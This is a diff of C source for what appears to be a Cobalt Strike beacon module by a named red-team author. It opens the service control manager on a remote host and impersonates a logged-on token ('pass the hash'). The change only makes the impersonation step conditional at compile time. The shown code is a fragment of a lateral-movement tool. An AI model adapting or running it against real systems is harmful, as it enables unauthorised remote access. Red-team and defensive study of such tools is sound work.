@@ -1,6 +1,6 @@
 // Author: Mr.Un1k0d3r RingZer0 Team
 
-#include <Windows.h>
+#include <windows.h>
 #include <stdio.h>
 #include "beacon.h"
 
@@ -39,6 +39,7 @@ void go(char * args, int length) {
 
     BeaconPrintf(CALLBACK_OUTPUT, "Trying to connect to %s\n", targetHost);
 
+#ifdef _IMP
     HANDLE hToken = NULL;
 
 	BeaconPrintf(CALLBACK_OUTPUT,  "Using current process context for authentication. (Pass the hash)\n");
@@ -53,6 +54,7 @@ void go(char * args, int length) {
         BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ImpersonateLoggedOnUser failed %ld\n", kernel32$GetLastError());
         return;
     }
+#endif
 
     SC_HANDLE schManager = Advapi32$OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
     if(schManager == NULL) {
@@ -111,7 +113,9 @@ void go(char * args, int length) {
     }
 	
     kernel32$GlobalFree(lpqsc);
+#ifdef _IMP
     kernel32$CloseHandle(hToken);
+#endif
     Advapi32$CloseServiceHandle(schManager);
     Advapi32$CloseServiceHandle(schService);
 }
